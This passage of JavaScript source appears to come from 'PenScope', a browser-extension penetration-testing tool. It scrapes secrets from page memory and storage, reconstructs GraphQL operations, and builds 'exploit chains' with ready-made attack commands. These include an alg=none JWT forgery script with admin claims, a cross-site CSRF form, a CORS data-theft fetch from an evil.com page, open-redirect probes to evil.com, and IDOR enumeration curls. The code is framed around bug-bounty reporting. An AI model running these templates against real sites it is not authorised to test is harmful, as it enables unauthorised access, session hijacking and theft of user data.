                if(v&&typeof v==="object"&&!Array.isArray(v)){
                  var subKeys=Object.keys(v).slice(0,30);
                  subKeys.forEach(function(k2){
                    try{
                      var v2=v[k2];
                      if(typeof v2==="string")check(v2,"window."+k+"."+k2);
                      else if(v2&&typeof v2==="object"){
                        Object.keys(v2).slice(0,20).forEach(function(k3){
                          try{if(typeof v2[k3]==="string")check(v2[k3],"window."+k+"."+k2+"."+k3);}catch(e){}
                        });
                      }
                    }catch(e){}
                  });
                }
                // Check function closures by converting to string
                if(typeof v==="function"){
                  var src=v.toString();
                  if(src.length<5000){
                    // Look for string literals in the function source
                    var strStart=0;
                    while(strStart<src.length&&found.length<50){
                      var qi=src.indexOf('"',strStart);
                      var qi2=src.indexOf("'",strStart);
                      if(qi===-1&&qi2===-1)break;
                      var qIdx=(qi===-1?qi2:qi2===-1?qi:Math.min(qi,qi2));
                      var qChar=src[qIdx];
                      var qEnd=src.indexOf(qChar,qIdx+1);
                      if(qEnd===-1||qEnd-qIdx>300){strStart=qIdx+1;continue;}
                      var strVal=src.substring(qIdx+1,qEnd);
                      if(strVal.length>=10)check(strVal,"closure:"+k);
                      strStart=qEnd+1;
                    }
                  }
                }
              }catch(e){}
            });
          }catch(e){}
        });
      }catch(e){}
      // Check sessionStorage and localStorage (deeper than mineMemoryStrings)
      try{for(var i=0;i<sessionStorage.length;i++){var sk=sessionStorage.key(i);var sv=sessionStorage.getItem(sk);if(sv)check(sv,"session."+sk);}}catch(e){}
      try{for(var i=0;i<localStorage.length;i++){var lk=localStorage.key(i);var lv=localStorage.getItem(lk);if(lv)check(lv,"local."+lk);}}catch(e){}
      return JSON.stringify(found);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{
      const secrets=JSON.parse(result.result.value);
      tab.heapSecrets=secrets.slice(0,100);
      // Also merge into main secrets list
      secrets.forEach(s=>{
        if(!seen(tabId,"hsec",s.type+":"+s.value.substring(0,30))){
          tab.secrets.push({type:s.type+" (heap)",value:s.value,severity:s.type==="High-Entropy"?"medium":"critical",source:s.source,context:"Found in V8 heap/closure"});
        }
      });
    }catch(e){console.warn('[PenScope] extractHeapSecrets',e.message||e);}
  });
}

// v5.6: GraphQL operation extractor — passive reconstruction of schema from captured POST bodies.
// Walks tab.postBodies, finds anything with a "query"/"mutation" field, extracts operation name,
// type, variables, and selected top-level fields. Aliases get mapped back to real field names.
// This surfaces a usable schema on every scan of a GraphQL target without needing introspection.
function extractGraphQLOps(tabId){
  const tab=T(tabId);
  const results=tab.graphqlOps||[];
  // Seed dedup set from existing entries so subsequent runs don't duplicate operations
  const seenOps=new Set();
  results.forEach(o=>seenOps.add(o.type+":"+o.name+":"+(o.fields||[]).slice(0,5).join(",")));
  function parseQueryString(q){
    if(!q||typeof q!=="string")return null;
    const typeMatch=q.match(/\b(query|mutation|subscription)\b/i);
    const type=typeMatch?typeMatch[1].toLowerCase():"query";
    const nameMatch=q.match(/(?:query|mutation|subscription)\s+([A-Za-z_][A-Za-z0-9_]*)/i);
    const name=nameMatch?nameMatch[1]:"(anonymous)";
    // Find first top-level selection set {...}
    const openIdx=q.indexOf("{");
    const fields=[];
    const fragments=[];
    if(openIdx>-1){
      // Collect field names at depth 1
      let depth=0,i=openIdx,curField="",collecting=false;
      while(i<q.length&&i-openIdx<3000){
        const ch=q[i];
        if(ch==="{"){depth++;if(depth===1)collecting=true;}
        else if(ch==="}"){depth--;if(depth===0)break;}
        else if(depth===1){
          if(/[A-Za-z0-9_]/.test(ch))curField+=ch;
          else if(curField){
            // Skip parentheses content (arguments)
            if(ch==="("){
              let pDepth=1;i++;
              while(i<q.length&&pDepth>0){if(q[i]==="(")pDepth++;else if(q[i]===")")pDepth--;i++;}
              i--;
            }
            if(curField&&!fields.includes(curField)&&!/^(on|true|false|null)$/.test(curField))fields.push(curField);
            curField="";
          }
        }
        i++;
      }
      if(curField&&!fields.includes(curField))fields.push(curField);
    }
    // Fragment extraction
    const fragRe=/\.{3}\s*([A-Za-z_][A-Za-z0-9_]*)/g;
    let fm;while((fm=fragRe.exec(q))!==null){if(!fragments.includes(fm[1]))fragments.push(fm[1]);}
    // Named fragment definitions
    const fragDefRe=/fragment\s+([A-Za-z_][A-Za-z0-9_]*)\s+on\s+([A-Za-z_][A-Za-z0-9_]*)/g;
    const fragDefs=[];
    let fdm;while((fdm=fragDefRe.exec(q))!==null)fragDefs.push({name:fdm[1],onType:fdm[2]});
    return{type,name,fields:fields.slice(0,30),fragments:fragments.slice(0,20),fragDefs};
  }
  (tab.postBodies||[]).forEach(p=>{
    if(!p.body||p.body.length<10)return;
    const body=p.body.trim();
    if(body.charAt(0)!=="{"&&body.charAt(0)!=="[")return;
    let obj;try{obj=JSON.parse(body);}catch{return;}
    const batch=Array.isArray(obj)?obj:[obj];
    batch.forEach(op=>{
      if(!op||typeof op!=="object")return;
      const query=op.query||op.mutation;
      if(!query||typeof query!=="string")return;
      const parsed=parseQueryString(query);
      if(!parsed)return;
      const key=parsed.type+":"+parsed.name+":"+parsed.fields.slice(0,5).join(",");
      if(seenOps.has(key))return;seenOps.add(key);
      const varNames=op.variables&&typeof op.variables==="object"?Object.keys(op.variables).slice(0,20):[];
      const varSample={};
      varNames.forEach(vn=>{
        try{const v=op.variables[vn];varSample[vn]=typeof v==="object"?JSON.stringify(v).substring(0,60):String(v).substring(0,60);}catch{}
      });
      results.push({
        name:parsed.name,
        type:parsed.type,
        fields:parsed.fields,
        fragments:parsed.fragments,
        fragDefs:parsed.fragDefs,
        variables:varNames,
        variableSample:varSample,
        url:p.url||"",
        path:p.path||"",
        contentType:p.contentType||"",
        queryPreview:query.substring(0,600).replace(/\s+/g," ").trim(),
        timestamp:p.timestamp||Date.now()
      });
    });
  });
  tab.graphqlOps=results;
}

// v5.6: Symbol table aggregator — collects pre-minification identifiers from every parsed source
// map's `names` array and flags the interesting ones (admin/auth/token/etc). This reveals the
// real function/variable names the frontend uses, which is gold for reverse-engineering minified
// bundles. Runs after source maps are parsed (either passively or by the probe).
function buildSymbolTable(tabId){
  const tab=T(tabId);
  const allNames=new Set();
  const byFile={};
  (tab.parsedSourceMaps||[]).forEach(sm=>{
    (sm.names||[]).forEach(n=>{
      if(!n||typeof n!=="string"||n.length<2||n.length>120)return;
      allNames.add(n);
      const file=(sm.url||"").split("/").pop()||"?";
      if(!byFile[file])byFile[file]=new Set();
      byFile[file].add(n);
    });
  });
  if(!allNames.size){tab.symbolTable=[];return;}
  const nameList=[...allNames];
  const interestRe=/^(?:.{0,30}(?:admin|auth|login|logout|session|token|jwt|secret|password|passwd|credent|priv(?:ate|ileg)|intern|debug|hidden|bypass|sudo|root|impersonat|permission|role|authz|apikey|api_key|backdoor|shadow|system|kernel|master|owner|superuser|mfa|2fa|otp|oauth|saml|sso|cert|key|vault|feature_?flag|kill_?switch|telemetry|metric))/i;
  const interesting=nameList.filter(n=>interestRe.test(n)).slice(0,300);
  const byFileObj={};
  Object.keys(byFile).slice(0,20).forEach(f=>{byFileObj[f]=[...byFile[f]].slice(0,100);});
  tab.symbolTable=[{
    total:allNames.size,
    interestingCount:interesting.length,
    interesting,
    sample:nameList.slice(0,500),
    byFile:byFileObj
  }];
}

// Run all passive analysis
// v5.9: Attack Chain Correlator — the headline intelligence feature.
// Walks tab state looking for combinations of findings that compound into something WORSE than
// any individual finding. A lone JWT in localStorage is medium; the same JWT + a confirmed
// endpoint that accepts it unverified + decoded role=admin is CRITICAL. This is what separates
// a tool that dumps data from a tool that tells you what to actually exploit.
//
// Each chain = {id, severity, title, summary, findings[], reproCmd, confidence}.
// Rendered at the TOP of the Deep tab so hunters see the compound wins first.
function analyzeExploitChains(tabId){
  const tab=T(tabId);
  const chains=[];
  // v5.9.1: The entire correlator is wrapped at the call site in runPassiveAnalysis, so if any
  // individual pattern below throws on malformed tab state, the whole function aborts and the
  // caller's catch logs it. This is simpler than per-pattern try/catch and means we get a clean
  // stack trace for debugging. The trade-off: one bad pattern kills chains that would've been
  // produced by later patterns. In practice, if one pattern has a bug it's almost always a dev
  // issue that should be fixed, not worked around silently.
  const baseUrl=(tab.url||"").split("/").slice(0,3).join("/")||"https://target.tld";
  const authCookie=(tab.cookies||[]).filter(c=>/identity|idsrv|session|auth|token|jwt|cookie/i.test(c.name)).slice(0,3).map(c=>`${c.name}=${(c.value||"").substring(0,50)}`).join("; ");
  const cookieFlag=authCookie?`-b "${authCookie}"`:"";

  // === Chain 1: Confirmed auth bypass + sensitive endpoint name ===
  // If probe found a path that returns 200 without auth AND the path name suggests sensitive
  // data (admin/user/billing/config), that's a critical chain — not just "missing auth" in the
  // abstract, but "missing auth on a path that obviously matters."
  const authRemoval=(tab.probeData?.authRemovalResults||[]).filter(r=>r.severity==="critical"||r.severity==="high");
  authRemoval.forEach(r=>{
    const sensitive=/\/(admin|user|account|billing|payment|invoice|settings|config|dashboard|manage|internal|private|profile|me\b|users|customers|employees|members|staff)/i.test(r.path||"");
    if(!sensitive)return;
    chains.push({
      id:`chain-authbypass-${chains.length}`,
      severity:"critical",
      title:`Authentication bypass on sensitive endpoint: ${r.path}`,
      summary:`PenScope's probe confirmed that ${r.method} ${r.path} returns the same data whether or not authentication cookies are sent (auth=${r.authStatus}, noauth=${r.noAuthStatus}, sameBody=${r.sameBody}). The path name strongly suggests this endpoint should be role-gated — it's returning sensitive data to unauthenticated callers.`,
      findings:[{type:"auth-removal",path:r.path,data:r}],
      reproCmd:`curl -i "${baseUrl}${r.path}"   # no auth, expect 200`,
      nextSteps:["Confirm with a different network/IP","Enumerate adjacent endpoints (/users → /users/1, /users/2)","Check if any PII is returned","Report to the program with the diff-body evidence"],
      confidence:0.95
    });
  });

  // === Chain 2: BAC + destructive intent ===
  const bac=(tab.probeData?.bacResults||[]).filter(b=>b.vulnerable);
  bac.forEach(b=>{
    const destructive=/delete|remove|destroy|revoke|ban|deactivate|cancel|wipe|purge/i.test(b.path||"");
    if(destructive){
      chains.push({
        id:`chain-bac-destructive-${chains.length}`,
        severity:"critical",
        title:`Destructive operation accessible without auth: ${b.method} ${b.path}`,
        summary:`Probe confirmed ${b.method} ${b.path} returns ${b.status} for the current role, and the endpoint name is destructive. This is a potential resource deletion vulnerability — do NOT actually call this with live data.`,
        findings:[{type:"bac",path:b.path,data:b}],
        reproCmd:`# Confirm only — don't actually run DELETE on prod\ncurl -X ${b.method} "${baseUrl}${b.path}" ${cookieFlag}`,
        nextSteps:["Confirm the endpoint actually deletes data (use a throwaway resource)","Check audit logs to see if the call is recorded","Report BEFORE any exploitation"],
        confidence:0.85
      });
    }else if(/admin|manage|config|settings|system/i.test(b.path||"")){
      chains.push({
        id:`chain-bac-admin-${chains.length}`,
        severity:"high",
        title:`Admin surface accessible: ${b.method} ${b.path}`,
        summary:`BAC probe confirmed a non-destructive admin endpoint is reachable (${b.status}). Combined with ${(tab.discoveredRoutes||[]).filter(r=>/admin/i.test(r.path)).length} other admin routes in code, this suggests broken privilege enforcement.`,
        findings:[{type:"bac",path:b.path,data:b}],
        reproCmd:`curl -X ${b.method} "${baseUrl}${b.path}" ${cookieFlag}`,
        nextSteps:["Enumerate adjacent admin endpoints","Check if responses contain user data","Map the admin functionality via discoveredRoutes"],
        confidence:0.85
      });
    }
  });

  // === Chain 3: CSRF-vulnerable GraphQL mutation ===
  const csrfVuln=(tab.probeData?.csrfResults||[]).filter(r=>r.severity==="critical"||r.severity==="high");
  const gqlMutVuln=csrfVuln.filter(r=>r.isGraphQLMutation);
  if(gqlMutVuln.length){
    chains.push({
      id:`chain-csrf-gql-${chains.length}`,
      severity:"high",
      title:`${gqlMutVuln.length} GraphQL mutations lack CSRF protection`,
      summary:`Probe confirmed ${gqlMutVuln.length} mutations accept cross-origin POST requests without CSRF token validation. GraphQL mutations frequently update state (createUser, deletePost, transferFunds, etc.) — any of these can be weaponized into a one-click attack via attacker-controlled HTML.`,
      findings:gqlMutVuln.map(r=>({type:"csrf",path:r.path,data:r})),
      reproCmd:`<!-- PoC — replace with actual mutation body -->\n<form action="${baseUrl}${gqlMutVuln[0].path}" method="POST" enctype="text/plain"><input name='{"query":"mutation{...}"}' value=""><input type="submit"></form>`,
      nextSteps:["Test each mutation for state change impact","Build a working PoC page","Check if SameSite=Lax cookie protection would prevent exploitation"],
      confidence:0.9
    });
  }

  // === Chain 4: Exposed auth token + usable endpoint ===
  const tokenSecrets=(tab.secrets||[]).filter(s=>/JWT|Bearer|Auth Token|API Key/i.test(s.type));
  const apiEndpoints=(tab.endpoints||[]).filter(e=>/\/api\/|\/v\d+\//i.test(e.path)&&e.status===200);
  if(tokenSecrets.length&&apiEndpoints.length){
    const topToken=tokenSecrets[0];
    chains.push({
      id:`chain-token-endpoint-${chains.length}`,
      severity:"critical",
      title:`Exposed ${topToken.type} + ${apiEndpoints.length} live API endpoints`,
      summary:`Found a ${topToken.type} at ${topToken.source} that's still active in page memory/storage, alongside ${apiEndpoints.length} live /api/ endpoints that likely accept it. Verify the token is long-lived — if so, it extends your access beyond the current session.`,
      findings:[
        {type:"secret",data:topToken},
        {type:"endpoints",data:apiEndpoints.slice(0,5)}
      ],
      reproCmd:`curl -H "Authorization: Bearer ${String(topToken.value||"").substring(0,30)}..." "${baseUrl}${apiEndpoints[0]?.path||"/api/me"}"`,
      nextSteps:["Decode the JWT to check expiry","Test the token against 5-10 endpoints","If long-lived, report as high-severity credential exposure","Check if the token works cross-origin"],
      confidence:0.7
    });
  }

  // === Chain 5: IDOR confirmed + sensitive data in response ===
  const idor=(tab.probeData?.idorAutoResults||[]).filter(r=>r.severity==="critical"||r.severity==="high");
  idor.forEach(r=>{
    if(r.sameSkeleton){
      chains.push({
        id:`chain-idor-${chains.length}`,
        severity:"critical",
        title:`Confirmed IDOR: ${r.path}`,
        summary:`Probe substituted ${r.originalId} → ${r.testedId} (${r.paramType}) and received a same-shaped response with different data (size ${r.originalSize}B → ${r.testedSize}B). This is high-confidence IDOR: the endpoint doesn't verify resource ownership.${r.fieldName?" Field: "+r.fieldName:""}`,
        findings:[{type:"idor",data:r}],
        reproCmd:`# Original:\ncurl "${baseUrl}${r.path||"/api/resource/"+r.originalId}" ${cookieFlag}\n# Tested (different user/resource):\ncurl "${baseUrl}${(r.path||"").replace(r.originalId,r.testedId)}" ${cookieFlag}`,
        nextSteps:["Enumerate across a larger ID range","Verify the returned data belongs to a different user","Check if write operations are also IDOR-able","Document 3+ examples for the report"],
        confidence:0.92
      });
    }
  });

  // === Chain 6: CORS reflection with credentials ===
  const cors=(tab.probeData?.corsResults||[]).filter(c=>c.severity==="critical"||c.reflected);
  cors.forEach(c=>{
    if(c.acac==="true"&&c.reflected){
      chains.push({
        id:`chain-cors-credential-${chains.length}`,
        severity:"critical",
        title:`Full CORS bypass: ${c.path} reflects arbitrary origins WITH credentials`,
        summary:`The endpoint reflected origin "${c.origin}" in Access-Control-Allow-Origin AND returned Access-Control-Allow-Credentials: true. Any origin can read authenticated responses — this is a total SOP bypass for cross-origin data theft.`,
        findings:[{type:"cors",data:c}],
        reproCmd:`<!-- PoC — attacker page at https://evil.com -->\nfetch("${baseUrl}${c.path}",{credentials:"include"}).then(r=>r.text()).then(console.log)`,
        nextSteps:["Confirm which response data is exposed","Test with a user's real browser session","Document the attacker-page PoC"],
        confidence:0.98
      });
    }
  });

  // === Chain 7: Open Redirect on an auth flow path ===
  const openRedir=(tab.probeData?.openRedirects||[]);
  openRedir.forEach(r=>{
    if(/\/(oauth|login|auth|callback|signin|saml|sso)/i.test(r.path||"")){
      chains.push({
        id:`chain-redir-auth-${chains.length}`,
        severity:"high",
        title:`Open redirect on auth flow: ${r.path}`,
        summary:`Parameter ${r.param} on an auth-related path redirects to attacker-controlled URLs. Combined with an OAuth-style flow, this is a token theft vector: attacker sends user to /oauth/authorize?...&redirect_uri=evil.com and captures the code/token.`,
        findings:[{type:"open-redirect",data:r}],
        reproCmd:`# Click-to-hijack:\ncurl -i "${baseUrl}${r.path}?${r.param}=https://evil.com"`,
        nextSteps:["Check if this is inside an OAuth code/token flow","Test with encoded variants (//evil.com, https:\\evil.com)","Craft the full OAuth hijack PoC if applicable"],
        confidence:0.85
      });
    }
  });

  // === Chain 8: Hidden admin route discovered in code but not observed ===
  const hiddenAdmin=(tab.discoveredRoutes||[]).filter(r=>!r.observed&&!r.isNoise&&/admin|backoffice|manage|controlpanel|superuser|moderator|sudo/i.test(r.path||""));
  if(hiddenAdmin.length>=3){
    chains.push({
      id:`chain-hidden-admin-${chains.length}`,
      severity:"high",
      title:`${hiddenAdmin.length} admin routes in code but never called`,
      summary:`These paths are referenced in the JavaScript bundle or source maps but were never requested during your session. They're likely gated by client-side role checks — try calling them directly and see if the server enforces authorization.`,
      findings:hiddenAdmin.slice(0,10).map(r=>({type:"hidden-route",path:r.path,data:r})),
      reproCmd:hiddenAdmin.slice(0,5).map(r=>`curl "${baseUrl}${r.path}" ${cookieFlag}`).join("\n"),
      nextSteps:["Try GET on each","For 200s, escalate to OPTIONS/POST/PUT","Check if response differs from the unauth version","Look for role-check bypass via X-User-Role header tricks"],
      confidence:0.7
    });
  }

  // === Chain 9: JWT alg=none accepted ===
  const jwtNone=(tab.probeData?.jwtAlgResults||[]).filter(r=>r.accepted);
  if(jwtNone.length){
    chains.push({
      id:`chain-jwt-none-${chains.length}`,
      severity:"critical",
      title:`JWT forgery possible: server accepts alg=none`,
      summary:`PenScope substituted the cookie JWT's algorithm with "none" and dropped the signature — the server still returned ${jwtNone[0].noneStatus}. This means you can forge arbitrary JWTs with any claims (role:admin, user_id:1, etc.) and the server will trust them.`,
      findings:[{type:"jwt-forgery",data:jwtNone[0]}],
      reproCmd:`# Build a JWT with custom claims:\nheader=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')\npayload=$(echo -n '{"sub":"admin","role":"admin"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')\ntoken="\${header}.\${payload}."\ncurl -H "Authorization: Bearer $token" "${baseUrl}/api/me"`,
      nextSteps:["Craft a JWT with elevated role claims","Confirm admin endpoints accept it","Report as JWT forgery vulnerability"],
      confidence:0.98
    });
  }

  // === Chain 10: Source map leaked secrets + matching endpoint ===
  const smSecrets=(tab.parsedSourceMaps||[]).flatMap(sm=>(sm.secrets||[]).map(s=>({...s,smUrl:sm.url})));
  if(smSecrets.length){
    chains.push({
      id:`chain-sourcemap-secret-${chains.length}`,
      severity:"high",
      title:`${smSecrets.length} secrets leaked in source maps`,
      summary:`The production build is shipping source maps that contain hardcoded secrets. These are recoverable by anyone who downloads the site's .map files. Even if the secrets are revoked, this indicates a CI/CD misconfiguration: source maps should never be deployed to production.`,
      findings:smSecrets.slice(0,10).map(s=>({type:"sourcemap-secret",data:s})),
      reproCmd:`curl "${smSecrets[0].smUrl||''}"  # the .map file is publicly downloadable`,
      nextSteps:["Verify each secret is still active","Check if removing .map from the deployment is feasible","Report as information disclosure + configuration issue"],
      confidence:0.95
    });
  }

  // === Chain 11: WebRTC private IP leak + internal subnet ===
  const privateIPs=(tab.webrtcLeaks||[]).filter(l=>l.type==="private");
  if(privateIPs.length){
    chains.push({
      id:`chain-webrtc-${chains.length}`,
      severity:"medium",
      title:`Internal network exposure via WebRTC STUN`,
      summary:`WebRTC leaked ${privateIPs.length} private IPs (${privateIPs.map(l=>l.ip).join(", ")}) which reveals the internal network topology. Combined with any SSRF or service-discovery vulnerabilities, this gives an attacker a map of what to scan.`,
      findings:privateIPs.map(l=>({type:"webrtc-leak",data:l})),
      reproCmd:`// Run in browser console:\nnew RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}).createDataChannel("")`,
      nextSteps:["Check if the site uses WebRTC features (video chat, screen share)","If not, recommend disabling WebRTC-SDP leakage","Chain with any SSRF finding"],
      confidence:0.8
    });
  }

  // === Chain 12: Recursive probe findings + specific sensitive data ===
  // Recursive probe state lives at tab.probeData.recursiveProbe (inside the probe result spread),
  // NOT at tab.recursiveProbeData — there's no separate state field. The v5.9 bug hunt caught
  // this — chain 12 never fired in v5.9.0 because I referenced the wrong path.
  const rp=tab.probeData&&tab.probeData.recursiveProbe;
  const recFindings=((rp&&rp.wave1)||[]).concat((rp&&rp.wave2)||[],(rp&&rp.wave3)||[]).flatMap(r=>(r.findings||[]).map(f=>({...f,path:r.path}))).filter(f=>f.severity==="critical"||f.severity==="high");
  if(recFindings.length>=3){
    chains.push({
      id:`chain-recursive-bulk-${chains.length}`,
      severity:"high",
      title:`${recFindings.length} sensitive findings across recursive probe responses`,
      summary:`The smart recursive probe found sensitive data (auth tokens, PII, internal URLs, etc.) across multiple endpoints. This is systemic — the app is leaking data in API responses that shouldn't be public.`,
      findings:recFindings.slice(0,10).map(f=>({type:"recursive-finding",data:f})),
      reproCmd:recFindings.slice(0,3).map(f=>`curl "${baseUrl}${f.path}" ${cookieFlag}`).join("\n"),
      nextSteps:["Audit each endpoint for the specific data type leaked","Check if responses are cacheable (CDN exposure)","Report as systemic data exposure"],
      confidence:0.85
    });
  }

  // === Chain 13 (v6.0): Stack-specific RCE surface ===
  // Triggered when a stack attack pack found a critical/high finding (e.g. Spring Boot
  // /actuator/heapdump returned 200, Laravel Ignition reflected payload, Rails secrets
  // leaked, etc.) Combines with auth context + endpoint enumeration for confidence.
  const stackHits=Array.isArray(tab.stackAttacks)?tab.stackAttacks.filter(a=>a&&(a.severity==="critical"||a.severity==="high")):[];
  if(stackHits.length){
    // Group by stack family so we don't emit one chain per hit (a Spring app with 5
    // actuator endpoints exposed should be ONE chain "Spring Boot RCE surface", not 5).
    const families={};
    stackHits.forEach(h=>{
      const fam=(h.source==="claude-queue")?"claude":(h.type||"").split("-")[0]||"stack";
      if(!families[fam])families[fam]=[];
      families[fam].push(h);
    });
    Object.entries(families).forEach(([fam,hits])=>{
      const top=hits[0];
      const adminCount=(tab.endpoints||[]).filter(e=>/\/(admin|manage|internal|backoffice)/i.test(e.path||"")).length;
      const secretCount=(tab.secrets||[]).filter(s=>s&&(s.severity==="critical"||s.severity==="high")).length;
      // Confidence: base 0.7, +0.15 if admin endpoints exist, +0.1 if there are secrets,
      // capped at 0.95. The sort uses this multiplied by severity ordinal.
      let conf=0.7;
      if(adminCount)conf+=0.15;
      if(secretCount)conf+=0.1;
      if(conf>0.95)conf=0.95;
      const sev=hits.some(h=>h.severity==="critical")?"critical":"high";
      chains.push({
        id:`chain-stack-${fam}-${chains.length}`,
        severity:sev,
        title:`Stack-specific RCE surface (${fam})`,
        summary:`PenScope's stack-aware attack pack for ${fam} found ${hits.length} sensitive endpoint${hits.length===1?"":"s"} exposed. ${adminCount?`Combined with ${adminCount} admin endpoints in observed traffic`:"With"} ${secretCount?`and ${secretCount} high-severity secrets in scope`:"and standard target context"}, this is a strong RCE / data-exfil candidate.`,
        findingType:`stack-${fam}`,
        findings:hits.slice(0,8).map(h=>({type:h.type,path:h.url||"",method:h.method||"GET",evidence:(h.evidence||"").substring(0,120),source:"stack-pack"})),
        reproCmd:hits.slice(0,3).map(h=>`curl -i "${h.url||""}"`).join("\n"),
        nextSteps:[
          `Verify each ${fam} endpoint manually with appropriate payloads`,
          "Check if the exposed endpoints leak environment variables, heap memory, or stack traces",
          "Combine with detected secrets/admin endpoints for full chain PoC",
          "Map the affected ${fam} subsystem version and search known CVEs",
        ].map(s=>s.replace("${fam}",fam)),
        confidence:conf
      });
    });
  }

  // Sort by severity × confidence
  try{
    const sevOrder={critical:4,high:3,medium:2,low:1,info:0};
    chains.sort((a,b)=>{
      const sa=(sevOrder[a.severity]||0)*(a.confidence||0.5);
      const sb=(sevOrder[b.severity]||0)*(b.confidence||0.5);
      return sb-sa;
    });
  }catch(e){console.warn('[PenScope] chain sort',e.message||e);}
  // Cap chain list size before assignment — persistence trim would do this anyway but we
  // don't want the render to iterate 100+ chains either.
  tab.exploitChains=chains.slice(0,50);
}

function runPassiveAnalysis(tabId){
  const tab=T(tabId);
  try{decodeAllJWTs(tabId);}catch(e){console.warn('[PenScope] decodeAllJWTs',e.message||e);}
  try{classifyAndFilterRoutes(tabId);}catch(e){console.warn('[PenScope] classifyAndFilterRoutes',e.message||e);}
  try{buildPermissionMatrix(tabId);}catch(e){console.warn('[PenScope] buildPermissionMatrix',e.message||e);}
  try{generateIDORTests(tabId);}catch(e){console.warn('[PenScope] generateIDORTests',e.message||e);}
  try{extractGraphQLOps(tabId);}catch(e){console.warn('[PenScope] extractGraphQLOps',e.message||e);}
  try{buildSymbolTable(tabId);}catch(e){console.warn('[PenScope] buildSymbolTable',e.message||e);}
  try{analyzeExploitChains(tabId);}catch(e){console.warn('[PenScope] analyzeExploitChains',e.message||e);}
  if(_debugTabs.has(tabId)&&!tab._passiveExtracted){
    tab._passiveExtracted=true;
    extractIndexedDB(tabId);
    extractCacheStorage(tabId);
    extractServiceWorkerRoutes(tabId);
    extractRealEventListeners(tabId);
    extractHttpOnlyCookies(tabId);
    extractHeapSecrets(tabId);
  }
  if(!tab._schemasExtracted&&tab.apiResponseBodies.length>0){
    tab._schemasExtracted=true;
    extractResponseSchemas(tabId);
  }
}

// -------------------------------------------------------
// 4. TAB LIFECYCLE
// -------------------------------------------------------
chrome.tabs.onRemoved.addListener(tabId=>{if(_debugTabs.has(tabId)){try{chrome.debugger.detach({tabId});}catch(e){console.warn('[PenScope] detach on remove',e.message||e);}_debugTabs.delete(tabId);}delete state[tabId];delete _scripts[tabId];Object.keys(_seen).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _seen[k];});Object.keys(_pending).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _pending[k];});try{chrome.storage.session.remove(`ps:tab:${tabId}`);}catch(e){}});
chrome.tabs.onUpdated.addListener((tabId,changeInfo)=>{if(changeInfo.status==="loading"&&changeInfo.url){const wasDeep=state[tabId]?.deepEnabled;delete state[tabId];if(_scripts[tabId])_scripts[tabId]=new Map();Object.keys(_seen).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _seen[k];});Object.keys(_pending).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _pending[k];});const t=T(tabId);t.url=changeInfo.url;t.deepEnabled=wasDeep;}if(changeInfo.url&&state[tabId])state[tabId].url=changeInfo.url;
  // v5: Trigger script extraction after page finishes loading
  if(changeInfo.status==="complete"&&_debugTabs.has(tabId)){
    setTimeout(()=>extractAllScriptSources(tabId),5000);
    setTimeout(()=>extractAllScriptSources(tabId),12000);
  }
});

// -------------------------------------------------------
// 5. MESSAGE HANDLER
// -------------------------------------------------------
chrome.runtime.onMessage.addListener((msg,sender,sendResponse)=>{
  switch(msg.action){
    case "getData":{const d=T(msg.tabId);markDirty(msg.tabId);const meta={};for(const[k,v]of Object.entries(d.endpointMeta))meta[k]={statuses:[...(v.statuses||[])],sizes:v.sizes||[],queries:[...(v.queries||[])]};
      // v4: Generate method suggestions on the fly
      const methodSuggestions=[];
      d.endpoints.filter(e=>/\/api\//i.test(e.path)&&e.method==="GET").forEach(ep=>{
        if(/\/\d{2,}(?:\/|$)/.test(ep.path)||/\/[a-f0-9]{8}-[a-f0-9]{4}/.test(ep.path)){
          methodSuggestions.push({path:ep.path,suggest:"PUT",reason:"Resource ID — test update"});
          methodSuggestions.push({path:ep.path,suggest:"DELETE",reason:"Resource ID — test delete"});
          methodSuggestions.push({path:ep.path,suggest:"PATCH",reason:"Resource ID — test partial update"});
        }
      });
      // Stealth: collect ephemeral DOM if debugger active
      if(_debugTabs.has(msg.tabId))collectEphemeralDOM(msg.tabId);
      // Auto-trigger extraction if runtime is empty and debugger is active
      if(_debugTabs.has(msg.tabId)&&(!d.runtime||!d.runtime.framework)&&!d.runtime?.interestingGlobals?.length)runRuntimeExtraction(msg.tabId);
      // v5.2: Run all passive analysis
      runPassiveAnalysis(msg.tabId);
      sendResponse({...d,params:Object.values(d.params),endpointMeta:meta,deepEnabled:_debugTabs.has(msg.tabId),methodSuggestions,runtime:d.runtime||{},interceptedRequests:(d.interceptedRequests||[]).slice(-100),networkTiming:d.networkTiming||{},scriptSources:d.scriptSources||[],consoleLogs:d.consoleLogs||[],auditIssues:d.auditIssues||[],executionContexts:d.executionContexts||[],discoveredRoutes:d.discoveredRoutes||[],probeData:d.probeData||null,indexedDBData:d.indexedDBData||[],cacheStorageData:d.cacheStorageData||[],jwtFindings:d.jwtFindings||[],permissionMatrix:d.permissionMatrix||[],idorTests:d.idorTests||[],postBodies:d.postBodies||[],apiResponseBodies:d.apiResponseBodies||[],coverageData:d.coverageData||null,domListeners:d.domListeners||[],shadowDOMData:d.shadowDOMData||[],memoryStrings:d.memoryStrings||[],encodedBlobs:d.encodedBlobs||[],dnsPrefetch:d.dnsPrefetch||[],iframeScan:d.iframeScan||[],headerIntel:d.headerIntel||[],perfEntries:d.perfEntries||[],cssContent:d.cssContent||[],harvestedMaps:d.harvestedMaps||[],realEventListeners:d.realEventListeners||[],httpOnlyCookies:d.httpOnlyCookies||[],responseSchemas:d.responseSchemas||[],heapSecrets:d.heapSecrets||[],parsedSourceMaps:d.parsedSourceMaps||[],grpcEndpoints:d.grpcEndpoints||[],wasmModules:d.wasmModules||[],webrtcLeaks:d.webrtcLeaks||[],broadcastChannels:d.broadcastChannels||[],webAuthnInfo:d.webAuthnInfo||null,compressionResults:d.compressionResults||[],grpcReflection:d.grpcReflection||null,wsHijackResults:d.wsHijackResults||[],cachePoisonProbe:d.cachePoisonProbe||[],timingOracle:d.timingOracle||[],coopCoepInfo:d.coopCoepInfo||null,storagePartition:d.storagePartition||[],webgpuInfo:d.webgpuInfo||null,graphqlOps:d.graphqlOps||[],symbolTable:d.symbolTable||[],exploitChains:d.exploitChains||[],
        // v6.0 — mode + future-phase fields flow through to the popup so the renderer
